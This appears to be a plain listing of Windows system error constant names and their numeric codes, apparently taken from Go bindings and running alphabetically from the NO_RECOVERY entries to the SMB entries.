ERROR_NO_RECOVERY_POLICY                                                  syscall.Errno = 6003
ERROR_NO_RECOVERY_PROGRAM                                                 syscall.Errno = 1082
ERROR_NO_SAVEPOINT_WITH_OPEN_FILES                                        syscall.Errno = 6842
ERROR_NO_SCROLLBARS                                                       syscall.Errno = 1447
ERROR_NO_SECRETS                                                          syscall.Errno = 8620
ERROR_NO_SECURITY_ON_OBJECT                                               syscall.Errno = 1350
ERROR_NO_SHUTDOWN_IN_PROGRESS                                             syscall.Errno = 1116
ERROR_NO_SIGNAL_SENT                                                      syscall.Errno = 205
ERROR_NO_SITENAME                                                         syscall.Errno = 1919
ERROR_NO_SITE_SETTINGS_OBJECT                                             syscall.Errno = 8619
ERROR_NO_SPOOL_SPACE                                                      syscall.Errno = 62
ERROR_NO_SUCH_ALIAS                                                       syscall.Errno = 1376
ERROR_NO_SUCH_DEVICE                                                      syscall.Errno = 433
ERROR_NO_SUCH_DEVICE_INTERFACE               Errno = 0x20000000 
ERROR_NO_SUCH_DEVINST                        Errno = 0x20000000 
ERROR_NO_SUCH_DOMAIN                                                      syscall.Errno = 1355
ERROR_NO_SUCH_GROUP                                                       syscall.Errno = 1319
ERROR_NO_SUCH_INTERFACE_CLASS                Errno = 0x20000000 
ERROR_NO_SUCH_INTERFACE_DEVICE               Errno = ERROR_NO_SUCH_DEVICE_INTERFACE
ERROR_NO_SUCH_LOGON_SESSION                                               syscall.Errno = 1312
ERROR_NO_SUCH_MEMBER                                                      syscall.Errno = 1387
ERROR_NO_SUCH_PACKAGE                                                     syscall.Errno = 1364
ERROR_NO_SUCH_PRIVILEGE                                                   syscall.Errno = 1313
ERROR_NO_SUCH_SITE                                                        syscall.Errno = 1249
ERROR_NO_SUCH_USER                                                        syscall.Errno = 1317
ERROR_NO_SUPPORTING_DRIVES                                                syscall.Errno = 4339
ERROR_NO_SYSTEM_MENU                                                      syscall.Errno = 1437
ERROR_NO_SYSTEM_RESOURCES                                                 syscall.Errno = 1450
ERROR_NO_TASK_QUEUE                                                       syscall.Errno = 427
ERROR_NO_TOKEN                                                            syscall.Errno = 1008
ERROR_NO_TRACKING_SERVICE                                                 syscall.Errno = 1172
ERROR_NO_TRUST_LSA_SECRET                                                 syscall.Errno = 1786
ERROR_NO_TRUST_SAM_ACCOUNT                                                syscall.Errno = 1787
ERROR_NO_TXF_METADATA                                                     syscall.Errno = 6816
ERROR_NO_UNICODE_TRANSLATION                                              syscall.Errno = 1113
ERROR_NO_USER_KEYS                                                        syscall.Errno = 6006
ERROR_NO_USER_SESSION_KEY                                                 syscall.Errno = 1394
ERROR_NO_VOLUME_ID                                                        syscall.Errno = 1173
ERROR_NO_VOLUME_LABEL                                                     syscall.Errno = 125
ERROR_NO_WILDCARD_CHARACTERS                                              syscall.Errno = 1417
ERROR_NO_WORK_DONE                                                        syscall.Errno = 235
ERROR_NO_WRITABLE_DC_FOUND                                                syscall.Errno = 8621
ERROR_NO_YIELD_PERFORMED                                                  syscall.Errno = 721
ERROR_NTLM_BLOCKED                                                        syscall.Errno = 1937
ERROR_NT_CROSS_ENCRYPTION_REQUIRED                                        syscall.Errno = 1386
ERROR_NULL_LM_PASSWORD                                                    syscall.Errno = 1304
ERROR_OBJECT_ALREADY_EXISTS                                               syscall.Errno = 5010
ERROR_OBJECT_IN_LIST                                                      syscall.Errno = 5011
ERROR_OBJECT_NAME_EXISTS                                                  syscall.Errno = 698
ERROR_OBJECT_NOT_EXTERNALLY_BACKED                                        syscall.Errno = 342
ERROR_OBJECT_NOT_FOUND                                                    syscall.Errno = 4312
ERROR_OBJECT_NO_LONGER_EXISTS                                             syscall.Errno = 6807
ERROR_OFFLOAD_READ_FILE_NOT_SUPPORTED                                     syscall.Errno = 4442
ERROR_OFFLOAD_READ_FLT_NOT_SUPPORTED                                      syscall.Errno = 4440
ERROR_OFFLOAD_WRITE_FILE_NOT_SUPPORTED                                    syscall.Errno = 4443
ERROR_OFFLOAD_WRITE_FLT_NOT_SUPPORTED                                     syscall.Errno = 4441
ERROR_OFFSET_ALIGNMENT_VIOLATION                                          syscall.Errno = 327
ERROR_OLD_WIN_VERSION                                                     syscall.Errno = 1150
ERROR_ONLY_IF_CONNECTED                                                   syscall.Errno = 1251
ERROR_ONLY_VALIDATE_VIA_AUTHENTICODE         Errno = 0x20000000 
ERROR_OPEN_FAILED                                                         syscall.Errno = 110
ERROR_OPEN_FILES                                                          syscall.Errno = 2401
ERROR_OPERATION_ABORTED                                                   syscall.Errno = 995
ERROR_OPERATION_IN_PROGRESS                                               syscall.Errno = 329
ERROR_OPERATION_NOT_ALLOWED_FROM_SYSTEM_COMPONENT                         syscall.Errno = 15145
ERROR_OPERATION_NOT_SUPPORTED_IN_TRANSACTION                              syscall.Errno = 6853
ERROR_OPLOCK_BREAK_IN_PROGRESS                                            syscall.Errno = 742
ERROR_OPLOCK_HANDLE_CLOSED                                                syscall.Errno = 803
ERROR_OPLOCK_NOT_GRANTED                                                  syscall.Errno = 300
ERROR_OPLOCK_SWITCHED_TO_NEW_HANDLE                                       syscall.Errno = 800
ERROR_ORPHAN_NAME_EXHAUSTED                                               syscall.Errno = 799
ERROR_OUTOFMEMORY                                                         syscall.Errno = 14
ERROR_OUT_OF_PAPER                                                        syscall.Errno = 28
ERROR_OUT_OF_STRUCTURES                                                   syscall.Errno = 84
ERROR_OVERRIDE_NOCHANGES                                                  syscall.Errno = 1252
ERROR_PACKAGED_SERVICE_REQUIRES_ADMIN_PRIVILEGES                          syscall.Errno = 15656
ERROR_PACKAGES_IN_USE                                                     syscall.Errno = 15618
ERROR_PACKAGES_REPUTATION_CHECK_FAILED                                    syscall.Errno = 15643
ERROR_PACKAGES_REPUTATION_CHECK_TIMEDOUT                                  syscall.Errno = 15644
ERROR_PACKAGE_ALREADY_EXISTS                                              syscall.Errno = 15611
ERROR_PACKAGE_MOVE_BLOCKED_BY_STREAMING                                   syscall.Errno = 15636
ERROR_PACKAGE_MOVE_FAILED                                                 syscall.Errno = 15627
ERROR_PACKAGE_NOT_SUPPORTED_ON_FILESYSTEM                                 syscall.Errno = 15635
ERROR_PACKAGE_REPOSITORY_CORRUPTED                                        syscall.Errno = 15614
ERROR_PACKAGE_STAGING_ONHOLD                                              syscall.Errno = 15638
ERROR_PACKAGE_UPDATING                                                    syscall.Errno = 15616
ERROR_PAGED_SYSTEM_RESOURCES                                              syscall.Errno = 1452
ERROR_PAGEFILE_CREATE_FAILED                                              syscall.Errno = 576
ERROR_PAGEFILE_QUOTA                                                      syscall.Errno = 1454
ERROR_PAGEFILE_QUOTA_EXCEEDED                                             syscall.Errno = 567
ERROR_PAGE_FAULT_COPY_ON_WRITE                                            syscall.Errno = 749
ERROR_PAGE_FAULT_DEMAND_ZERO                                              syscall.Errno = 748
ERROR_PAGE_FAULT_GUARD_PAGE                                               syscall.Errno = 750
ERROR_PAGE_FAULT_PAGING_FILE                                              syscall.Errno = 751
ERROR_PAGE_FAULT_TRANSITION                                               syscall.Errno = 747
ERROR_PARAMETER_QUOTA_EXCEEDED                                            syscall.Errno = 1283
ERROR_PARTIAL_COPY                                                        syscall.Errno = 299
ERROR_PARTITION_FAILURE                                                   syscall.Errno = 1105
ERROR_PARTITION_TERMINATING                                               syscall.Errno = 1184
ERROR_PASSWORD_CHANGE_REQUIRED                                            syscall.Errno = 1938
ERROR_PASSWORD_EXPIRED                                                    syscall.Errno = 1330
ERROR_PASSWORD_MUST_CHANGE                                                syscall.Errno = 1907
ERROR_PASSWORD_RESTRICTION                                                syscall.Errno = 1325
ERROR_PATCH_MANAGED_ADVERTISED_PRODUCT                                    syscall.Errno = 1651
ERROR_PATCH_NO_SEQUENCE                                                   syscall.Errno = 1648
ERROR_PATCH_PACKAGE_INVALID                                               syscall.Errno = 1636
ERROR_PATCH_PACKAGE_OPEN_FAILED                                           syscall.Errno = 1635
ERROR_PATCH_PACKAGE_REJECTED                                              syscall.Errno = 1643
ERROR_PATCH_PACKAGE_UNSUPPORTED                                           syscall.Errno = 1637
ERROR_PATCH_REMOVAL_DISALLOWED                                            syscall.Errno = 1649
ERROR_PATCH_REMOVAL_UNSUPPORTED                                           syscall.Errno = 1646
ERROR_PATCH_TARGET_NOT_FOUND                                              syscall.Errno = 1642
ERROR_PATH_BUSY                                                           syscall.Errno = 148
ERROR_PATH_NOT_FOUND                                                      syscall.Errno = 3
ERROR_PER_USER_TRUST_QUOTA_EXCEEDED                                       syscall.Errno = 1932
ERROR_PIPE_BUSY                                                           syscall.Errno = 231
ERROR_PIPE_CONNECTED                                                      syscall.Errno = 535
ERROR_PIPE_LISTENING                                                      syscall.Errno = 536
ERROR_PIPE_LOCAL                                                          syscall.Errno = 229
ERROR_PIPE_NOT_CONNECTED                                                  syscall.Errno = 233
ERROR_PKINIT_FAILURE                                                      syscall.Errno = 1263
ERROR_PLATFORM_MANIFEST_BINARY_ID_NOT_FOUND                               syscall.Errno = 4574
ERROR_PLATFORM_MANIFEST_CATALOG_NOT_AUTHORIZED                            syscall.Errno = 4573
ERROR_PLATFORM_MANIFEST_FILE_NOT_AUTHORIZED                               syscall.Errno = 4572
ERROR_PLATFORM_MANIFEST_INVALID                                           syscall.Errno = 4571
ERROR_PLATFORM_MANIFEST_NOT_ACTIVE                                        syscall.Errno = 4575
ERROR_PLATFORM_MANIFEST_NOT_AUTHORIZED                                    syscall.Errno = 4570
ERROR_PLATFORM_MANIFEST_NOT_SIGNED                                        syscall.Errno = 4576
ERROR_PLUGPLAY_QUERY_VETOED                                               syscall.Errno = 683
ERROR_PNP_BAD_MPS_TABLE                                                   syscall.Errno = 671
ERROR_PNP_INVALID_ID                                                      syscall.Errno = 674
ERROR_PNP_IRQ_TRANSLATION_FAILED                                          syscall.Errno = 673
ERROR_PNP_QUERY_REMOVE_DEVICE_TIMEOUT                                     syscall.Errno = 480
ERROR_PNP_QUERY_REMOVE_RELATED_DEVICE_TIMEOUT                             syscall.Errno = 481
ERROR_PNP_QUERY_REMOVE_UNRELATED_DEVICE_TIMEOUT                           syscall.Errno = 482
ERROR_PNP_REBOOT_REQUIRED                                                 syscall.Errno = 638
ERROR_PNP_REGISTRY_ERROR                     Errno = 0x20000000 
ERROR_PNP_RESTART_ENUMERATION                                             syscall.Errno = 636
ERROR_PNP_TRANSLATION_FAILED                                              syscall.Errno = 672
ERROR_POINT_NOT_FOUND                                                     syscall.Errno = 1171
ERROR_POLICY_OBJECT_NOT_FOUND                                             syscall.Errno = 8219
ERROR_POLICY_ONLY_IN_DS                                                   syscall.Errno = 8220
ERROR_POPUP_ALREADY_ACTIVE                                                syscall.Errno = 1446
ERROR_PORT_MESSAGE_TOO_LONG                                               syscall.Errno = 546
ERROR_PORT_NOT_SET                                                        syscall.Errno = 642
ERROR_PORT_UNREACHABLE                                                    syscall.Errno = 1234
ERROR_POSSIBLE_DEADLOCK                                                   syscall.Errno = 1131
ERROR_POTENTIAL_FILE_FOUND                                                syscall.Errno = 1180
ERROR_PREDEFINED_HANDLE                                                   syscall.Errno = 714
ERROR_PRIMARY_TRANSPORT_CONNECT_FAILED                                    syscall.Errno = 746
ERROR_PRINTER_ALREADY_EXISTS                                              syscall.Errno = 1802
ERROR_PRINTER_DELETED                                                     syscall.Errno = 1905
ERROR_PRINTER_DRIVER_ALREADY_INSTALLED                                    syscall.Errno = 1795
ERROR_PRINTER_DRIVER_BLOCKED                                              syscall.Errno = 3014
ERROR_PRINTER_DRIVER_DOWNLOAD_NEEDED                                      syscall.Errno = 3019
ERROR_PRINTER_DRIVER_IN_USE                                               syscall.Errno = 3001
ERROR_PRINTER_DRIVER_PACKAGE_IN_USE                                       syscall.Errno = 3015
ERROR_PRINTER_DRIVER_WARNED                                               syscall.Errno = 3013
ERROR_PRINTER_HAS_JOBS_QUEUED                                             syscall.Errno = 3009
ERROR_PRINTER_NOT_FOUND                                                   syscall.Errno = 3012
ERROR_PRINTER_NOT_SHAREABLE                                               syscall.Errno = 3022
ERROR_PRINTQ_FULL                                                         syscall.Errno = 61
ERROR_PRINT_CANCELLED                                                     syscall.Errno = 63
ERROR_PRINT_JOB_RESTART_REQUIRED                                          syscall.Errno = 3020
ERROR_PRINT_MONITOR_ALREADY_INSTALLED                                     syscall.Errno = 3006
ERROR_PRINT_MONITOR_IN_USE                                                syscall.Errno = 3008
ERROR_PRINT_PROCESSOR_ALREADY_INSTALLED                                   syscall.Errno = 3005
ERROR_PRIVATE_DIALOG_INDEX                                                syscall.Errno = 1415
ERROR_PRIVILEGE_NOT_HELD                                                  syscall.Errno = 1314
ERROR_PRI_MERGE_ADD_FILE_FAILED                                           syscall.Errno = 15151
ERROR_PRI_MERGE_BUNDLE_PACKAGES_NOT_ALLOWED                               syscall.Errno = 15155
ERROR_PRI_MERGE_INVALID_FILE_NAME                                         syscall.Errno = 15158
ERROR_PRI_MERGE_LOAD_FILE_FAILED                                          syscall.Errno = 15150
ERROR_PRI_MERGE_MAIN_PACKAGE_REQUIRED                                     syscall.Errno = 15156
ERROR_PRI_MERGE_MISSING_SCHEMA                                            syscall.Errno = 15149
ERROR_PRI_MERGE_MULTIPLE_MAIN_PACKAGES_NOT_ALLOWED                        syscall.Errno = 15154
ERROR_PRI_MERGE_MULTIPLE_PACKAGE_FAMILIES_NOT_ALLOWED                     syscall.Errno = 15153
ERROR_PRI_MERGE_RESOURCE_PACKAGE_REQUIRED                                 syscall.Errno = 15157
ERROR_PRI_MERGE_VERSION_MISMATCH                                          syscall.Errno = 15148
ERROR_PRI_MERGE_WRITE_FILE_FAILED                                         syscall.Errno = 15152
ERROR_PROCESS_ABORTED                                                     syscall.Errno = 1067
ERROR_PROCESS_IN_JOB                                                      syscall.Errno = 760
ERROR_PROCESS_IS_PROTECTED                                                syscall.Errno = 1293
ERROR_PROCESS_MODE_ALREADY_BACKGROUND                                     syscall.Errno = 402
ERROR_PROCESS_MODE_NOT_BACKGROUND                                         syscall.Errno = 403
ERROR_PROCESS_NOT_IN_JOB                                                  syscall.Errno = 759
ERROR_PROC_NOT_FOUND                                                      syscall.Errno = 127
ERROR_PRODUCT_UNINSTALLED                                                 syscall.Errno = 1614
ERROR_PRODUCT_VERSION                                                     syscall.Errno = 1638
ERROR_PROFILE_DOES_NOT_MATCH_DEVICE                                       syscall.Errno = 2023
ERROR_PROFILE_NOT_ASSOCIATED_WITH_DEVICE                                  syscall.Errno = 2015
ERROR_PROFILE_NOT_FOUND                                                   syscall.Errno = 2016
ERROR_PROFILING_AT_LIMIT                                                  syscall.Errno = 553
ERROR_PROFILING_NOT_STARTED                                               syscall.Errno = 550
ERROR_PROFILING_NOT_STOPPED                                               syscall.Errno = 551
ERROR_PROMOTION_ACTIVE                                                    syscall.Errno = 8221
ERROR_PROTOCOL_UNREACHABLE                                                syscall.Errno = 1233
ERROR_PROVISION_OPTIONAL_PACKAGE_REQUIRES_MAIN_PACKAGE_PROVISIONED        syscall.Errno = 15642
ERROR_PWD_HISTORY_CONFLICT                                                syscall.Errno = 617
ERROR_PWD_TOO_LONG                                                        syscall.Errno = 657
ERROR_PWD_TOO_RECENT                                                      syscall.Errno = 616
ERROR_PWD_TOO_SHORT                                                       syscall.Errno = 615
ERROR_QUERY_STORAGE_ERROR                                                 syscall.Errno = 0x803A0001
ERROR_QUORUMLOG_OPEN_FAILED                                               syscall.Errno = 5028
ERROR_QUORUM_DISK_NOT_FOUND                                               syscall.Errno = 5086
ERROR_QUORUM_NOT_ALLOWED_IN_THIS_GROUP                                    syscall.Errno = 5928
ERROR_QUORUM_OWNER_ALIVE                                                  syscall.Errno = 5034
ERROR_QUORUM_RESOURCE                                                     syscall.Errno = 5020
ERROR_QUORUM_RESOURCE_ONLINE_FAILED                                       syscall.Errno = 5027
ERROR_QUOTA_ACTIVITY                                                      syscall.Errno = 810
ERROR_QUOTA_LIST_INCONSISTENT                                             syscall.Errno = 621
ERROR_RANGE_LIST_CONFLICT                                                 syscall.Errno = 627
ERROR_RANGE_NOT_FOUND                                                     syscall.Errno = 644
ERROR_RDP_PROTOCOL_ERROR                                                  syscall.Errno = 7065
ERROR_READ_FAULT                                                          syscall.Errno = 30
ERROR_RECEIVE_EXPEDITED                                                   syscall.Errno = 708
ERROR_RECEIVE_PARTIAL                                                     syscall.Errno = 707
ERROR_RECEIVE_PARTIAL_EXPEDITED                                           syscall.Errno = 709
ERROR_RECOVERY_FAILURE                                                    syscall.Errno = 1279
ERROR_RECOVERY_FILE_CORRUPT                                               syscall.Errno = 15619
ERROR_RECOVERY_NOT_NEEDED                                                 syscall.Errno = 6821
ERROR_REC_NON_EXISTENT                                                    syscall.Errno = 4005
ERROR_REDIRECTOR_HAS_OPEN_HANDLES                                         syscall.Errno = 1794
ERROR_REDIR_PAUSED                                                        syscall.Errno = 72
ERROR_REGISTRATION_FROM_REMOTE_DRIVE_NOT_SUPPORTED                        syscall.Errno = 15647
ERROR_REGISTRY_CORRUPT                                                    syscall.Errno = 1015
ERROR_REGISTRY_HIVE_RECOVERED                                             syscall.Errno = 685
ERROR_REGISTRY_IO_FAILED                                                  syscall.Errno = 1016
ERROR_REGISTRY_QUOTA_LIMIT                                                syscall.Errno = 613
ERROR_REGISTRY_RECOVERED                                                  syscall.Errno = 1014
ERROR_REG_NAT_CONSUMPTION                                                 syscall.Errno = 1261
ERROR_RELOC_CHAIN_XEEDS_SEGLIM                                            syscall.Errno = 201
ERROR_REMOTE_COMM_FAILURE                    Errno = 0x20000000 
ERROR_REMOTE_FILE_VERSION_MISMATCH                                        syscall.Errno = 6814
ERROR_REMOTE_PRINT_CONNECTIONS_BLOCKED                                    syscall.Errno = 1936
ERROR_REMOTE_REQUEST_UNSUPPORTED             Errno = 0x20000000 
ERROR_REMOTE_SESSION_LIMIT_EXCEEDED                                       syscall.Errno = 1220
ERROR_REMOTE_STORAGE_MEDIA_ERROR                                          syscall.Errno = 4352
ERROR_REMOTE_STORAGE_NOT_ACTIVE                                           syscall.Errno = 4351
ERROR_REMOVE_FAILED                                                       syscall.Errno = 15610
ERROR_REM_NOT_LIST                                                        syscall.Errno = 51
ERROR_REPARSE                                                             syscall.Errno = 741
ERROR_REPARSE_ATTRIBUTE_CONFLICT                                          syscall.Errno = 4391
ERROR_REPARSE_OBJECT                                                      syscall.Errno = 755
ERROR_REPARSE_POINT_ENCOUNTERED                                           syscall.Errno = 4395
ERROR_REPARSE_TAG_INVALID                                                 syscall.Errno = 4393
ERROR_REPARSE_TAG_MISMATCH                                                syscall.Errno = 4394
ERROR_REPLY_MESSAGE_MISMATCH                                              syscall.Errno = 595
ERROR_REQUEST_ABORTED                                                     syscall.Errno = 1235
ERROR_REQUEST_OUT_OF_SEQUENCE                                             syscall.Errno = 776
ERROR_REQUEST_PAUSED                                                      syscall.Errno = 3050
ERROR_REQUEST_REFUSED                                                     syscall.Errno = 4320
ERROR_REQUIRES_INTERACTIVE_WINDOWSTATION                                  syscall.Errno = 1459
ERROR_REQ_NOT_ACCEP                                                       syscall.Errno = 71
ERROR_RESIDENT_FILE_NOT_SUPPORTED                                         syscall.Errno = 334
ERROR_RESILIENCY_FILE_CORRUPT                                             syscall.Errno = 15625
ERROR_RESMON_CREATE_FAILED                                                syscall.Errno = 5017
ERROR_RESMON_INVALID_STATE                                                syscall.Errno = 5084
ERROR_RESMON_ONLINE_FAILED                                                syscall.Errno = 5018
ERROR_RESMON_SYSTEM_RESOURCES_LACKING                                     syscall.Errno = 5956
ERROR_RESOURCEMANAGER_NOT_FOUND                                           syscall.Errno = 6716
ERROR_RESOURCEMANAGER_READ_ONLY                                           syscall.Errno = 6707
ERROR_RESOURCE_CALL_TIMED_OUT                                             syscall.Errno = 5910
ERROR_RESOURCE_DATA_NOT_FOUND                                             syscall.Errno = 1812
ERROR_RESOURCE_DISABLED                                                   syscall.Errno = 4309
ERROR_RESOURCE_ENUM_USER_STOP                                             syscall.Errno = 15106
ERROR_RESOURCE_FAILED                                                     syscall.Errno = 5038
ERROR_RESOURCE_LANG_NOT_FOUND                                             syscall.Errno = 1815
ERROR_RESOURCE_NAME_NOT_FOUND                                             syscall.Errno = 1814
ERROR_RESOURCE_NOT_AVAILABLE                                              syscall.Errno = 5006
ERROR_RESOURCE_NOT_FOUND                                                  syscall.Errno = 5007
ERROR_RESOURCE_NOT_IN_AVAILABLE_STORAGE                                   syscall.Errno = 5965
ERROR_RESOURCE_NOT_ONLINE                                                 syscall.Errno = 5004
ERROR_RESOURCE_NOT_PRESENT                                                syscall.Errno = 4316
ERROR_RESOURCE_ONLINE                                                     syscall.Errno = 5019
ERROR_RESOURCE_PROPERTIES_STORED                                          syscall.Errno = 5024
ERROR_RESOURCE_PROPERTY_UNCHANGEABLE                                      syscall.Errno = 5089
ERROR_RESOURCE_REQUIREMENTS_CHANGED                                       syscall.Errno = 756
ERROR_RESOURCE_TYPE_NOT_FOUND                                             syscall.Errno = 1813
ERROR_RESTART_APPLICATION                                                 syscall.Errno = 1467
ERROR_RESUME_HIBERNATION                                                  syscall.Errno = 727
ERROR_RETRY                                                               syscall.Errno = 1237
ERROR_REVISION_MISMATCH                                                   syscall.Errno = 1306
ERROR_RING2SEG_MUST_BE_MOVABLE                                            syscall.Errno = 200
ERROR_RING2_STACK_IN_USE                                                  syscall.Errno = 207
ERROR_RMODE_APP                                                           syscall.Errno = 1153
ERROR_RM_ALREADY_STARTED                                                  syscall.Errno = 6822
ERROR_RM_CANNOT_BE_FROZEN_FOR_SNAPSHOT                                    syscall.Errno = 6728
ERROR_RM_DISCONNECTED                                                     syscall.Errno = 6819
ERROR_RM_METADATA_CORRUPT                                                 syscall.Errno = 6802
ERROR_RM_NOT_ACTIVE                                                       syscall.Errno = 6801
ERROR_ROLLBACK_TIMER_EXPIRED                                              syscall.Errno = 6829
ERROR_ROWSNOTRELEASED                                                     syscall.Errno = 772
ERROR_RPL_NOT_ALLOWED                                                     syscall.Errno = 4006
ERROR_RUNLEVEL_SWITCH_AGENT_TIMEOUT                                       syscall.Errno = 15403
ERROR_RUNLEVEL_SWITCH_IN_PROGRESS                                         syscall.Errno = 15404
ERROR_RUNLEVEL_SWITCH_TIMEOUT                                             syscall.Errno = 15402
ERROR_RWRAW_ENCRYPTED_FILE_NOT_ENCRYPTED                                  syscall.Errno = 410
ERROR_RWRAW_ENCRYPTED_INVALID_EDATAINFO_FILEOFFSET                        syscall.Errno = 411
ERROR_RWRAW_ENCRYPTED_INVALID_EDATAINFO_FILERANGE                         syscall.Errno = 412
ERROR_RWRAW_ENCRYPTED_INVALID_EDATAINFO_PARAMETER                         syscall.Errno = 413
ERROR_RXACT_COMMITTED                                                     syscall.Errno = 744
ERROR_RXACT_COMMIT_FAILURE                                                syscall.Errno = 1370
ERROR_RXACT_COMMIT_NECESSARY                                              syscall.Errno = 678
ERROR_RXACT_INVALID_STATE                                                 syscall.Errno = 1369
ERROR_RXACT_STATE_CREATED                                                 syscall.Errno = 701
ERROR_SAME_DRIVE                                                          syscall.Errno = 143
ERROR_SAM_INIT_FAILURE                                                    syscall.Errno = 8541
ERROR_SCE_DISABLED                           Errno = 0x20000000 
ERROR_SCOPE_NOT_FOUND                                                     syscall.Errno = 318
ERROR_SCREEN_ALREADY_LOCKED                                               syscall.Errno = 1440
ERROR_SCRUB_DATA_DISABLED                                                 syscall.Errno = 332
ERROR_SECCORE_INVALID_COMMAND                                             Handle        = 0xC0E80000
ERROR_SECONDARY_IC_PROVIDER_NOT_REGISTERED                                syscall.Errno = 15321
ERROR_SECRET_TOO_LONG                                                     syscall.Errno = 1382
ERROR_SECTION_NAME_TOO_LONG                  Errno = 0x20000000 
ERROR_SECTION_NOT_FOUND                      Errno = 0x20000000 
ERROR_SECTOR_NOT_FOUND                                                    syscall.Errno = 27
ERROR_SECUREBOOT_FILE_REPLACED                                            syscall.Errno = 4426
ERROR_SECUREBOOT_INVALID_POLICY                                           syscall.Errno = 4422
ERROR_SECUREBOOT_NOT_BASE_POLICY                                          syscall.Errno = 4434
ERROR_SECUREBOOT_NOT_ENABLED                                              syscall.Errno = 4425
ERROR_SECUREBOOT_NOT_SUPPLEMENTAL_POLICY                                  syscall.Errno = 4435
ERROR_SECUREBOOT_PLATFORM_ID_MISMATCH                                     syscall.Errno = 4430
ERROR_SECUREBOOT_POLICY_MISSING_ANTIROLLBACKVERSION                       syscall.Errno = 4429
ERROR_SECUREBOOT_POLICY_NOT_AUTHORIZED                                    syscall.Errno = 4427
ERROR_SECUREBOOT_POLICY_NOT_SIGNED                                        syscall.Errno = 4424
ERROR_SECUREBOOT_POLICY_PUBLISHER_NOT_FOUND                               syscall.Errno = 4423
ERROR_SECUREBOOT_POLICY_ROLLBACK_DETECTED                                 syscall.Errno = 4431
ERROR_SECUREBOOT_POLICY_UNKNOWN                                           syscall.Errno = 4428
ERROR_SECUREBOOT_POLICY_UPGRADE_MISMATCH                                  syscall.Errno = 4432
ERROR_SECUREBOOT_POLICY_VIOLATION                                         syscall.Errno = 4421
ERROR_SECUREBOOT_REQUIRED_POLICY_FILE_MISSING                             syscall.Errno = 4433
ERROR_SECUREBOOT_ROLLBACK_DETECTED                                        syscall.Errno = 4420
ERROR_SECURITY_STREAM_IS_INCONSISTENT                                     syscall.Errno = 306
ERROR_SEEK                                                                syscall.Errno = 25
ERROR_SEEK_ON_DEVICE                                                      syscall.Errno = 132
ERROR_SEGMENT_NOTIFICATION                                                syscall.Errno = 702
ERROR_SEM_IS_SET                                                          syscall.Errno = 102
ERROR_SEM_NOT_FOUND                                                       syscall.Errno = 187
ERROR_SEM_OWNER_DIED                                                      syscall.Errno = 105
ERROR_SEM_TIMEOUT                                                         syscall.Errno = 121
ERROR_SEM_USER_LIMIT                                                      syscall.Errno = 106
ERROR_SERIAL_NO_DEVICE                                                    syscall.Errno = 1118
ERROR_SERVER_DISABLED                                                     syscall.Errno = 1341
ERROR_SERVER_HAS_OPEN_HANDLES                                             syscall.Errno = 1811
ERROR_SERVER_NOT_DISABLED                                                 syscall.Errno = 1342
ERROR_SERVER_SHUTDOWN_IN_PROGRESS                                         syscall.Errno = 1255
ERROR_SERVER_SID_MISMATCH                                                 syscall.Errno = 628
ERROR_SERVICES_FAILED_AUTOSTART                                           syscall.Errno = 15405
ERROR_SERVICE_ALREADY_RUNNING                                             syscall.Errno = 1056
ERROR_SERVICE_CANNOT_ACCEPT_CTRL                                          syscall.Errno = 1061
ERROR_SERVICE_DATABASE_LOCKED                                             syscall.Errno = 1055
ERROR_SERVICE_DEPENDENCY_DELETED                                          syscall.Errno = 1075
ERROR_SERVICE_DEPENDENCY_FAIL                                             syscall.Errno = 1068
ERROR_SERVICE_DISABLED                                                    syscall.Errno = 1058
ERROR_SERVICE_DOES_NOT_EXIST                                              syscall.Errno = 1060
ERROR_SERVICE_EXISTS                                                      syscall.Errno = 1073
ERROR_SERVICE_EXISTS_AS_NON_PACKAGED_SERVICE                              syscall.Errno = 15655
ERROR_SERVICE_LOGON_FAILED                                                syscall.Errno = 1069
ERROR_SERVICE_MARKED_FOR_DELETE                                           syscall.Errno = 1072
ERROR_SERVICE_NEVER_STARTED                                               syscall.Errno = 1077
ERROR_SERVICE_NOTIFICATION                                                syscall.Errno = 716
ERROR_SERVICE_NOTIFY_CLIENT_LAGGING                                       syscall.Errno = 1294
ERROR_SERVICE_NOT_ACTIVE                                                  syscall.Errno = 1062
ERROR_SERVICE_NOT_FOUND                                                   syscall.Errno = 1243
ERROR_SERVICE_NOT_IN_EXE                                                  syscall.Errno = 1083
ERROR_SERVICE_NO_THREAD                                                   syscall.Errno = 1054
ERROR_SERVICE_REQUEST_TIMEOUT                                             syscall.Errno = 1053
ERROR_SERVICE_SPECIFIC_ERROR                                              syscall.Errno = 1066
ERROR_SERVICE_START_HANG                                                  syscall.Errno = 1070
ERROR_SESSION_CREDENTIAL_CONFLICT                                         syscall.Errno = 1219
ERROR_SETCOUNT_ON_BAD_LB                                                  syscall.Errno = 1433
ERROR_SETMARK_DETECTED                                                    syscall.Errno = 1103
ERROR_SET_CONTEXT_DENIED                                                  syscall.Errno = 1660
ERROR_SET_NOT_FOUND                                                       syscall.Errno = 1170
ERROR_SET_POWER_STATE_FAILED                                              syscall.Errno = 1141
ERROR_SET_POWER_STATE_VETOED                                              syscall.Errno = 1140
ERROR_SET_SYSTEM_RESTORE_POINT               Errno = 0x20000000 
ERROR_SHARED_POLICY                                                       syscall.Errno = 8218
ERROR_SHARING_BUFFER_EXCEEDED                                             syscall.Errno = 36
ERROR_SHARING_PAUSED                                                      syscall.Errno = 70
ERROR_SHARING_VIOLATION                                                   syscall.Errno = 32
ERROR_SHORT_NAMES_NOT_ENABLED_ON_VOLUME                                   syscall.Errno = 305
ERROR_SHUTDOWN_CLUSTER                                                    syscall.Errno = 5008
ERROR_SHUTDOWN_IN_PROGRESS                                                syscall.Errno = 1115
ERROR_SHUTDOWN_IS_SCHEDULED                                               syscall.Errno = 1190
ERROR_SHUTDOWN_USERS_LOGGED_ON                                            syscall.Errno = 1191
ERROR_SIGNAL_PENDING                                                      syscall.Errno = 162
ERROR_SIGNAL_REFUSED                                                      syscall.Errno = 156
ERROR_SIGNATURE_OSATTRIBUTE_MISMATCH         Errno = 0x20000000 
ERROR_SINGLETON_RESOURCE_INSTALLED_IN_ACTIVE_USER                         syscall.Errno = 15653
ERROR_SINGLE_INSTANCE_APP                                                 syscall.Errno = 1152
ERROR_SMARTCARD_SUBSYSTEM_FAILURE                                         syscall.Errno = 1264
ERROR_SMB1_NOT_AVAILABLE                                                  syscall.Errno = 384
ERROR_SMB_BAD_CLUSTER_DIALECT                                             Handle        = 0xC05D0001
ERROR_SMB_GUEST_LOGON_BLOCKED                                             syscall.Errno = 1272
ERROR_SMB_NO_PREAUTH_INTEGRITY_HASH_OVERLAP                               Handle        = 0xC05D0000
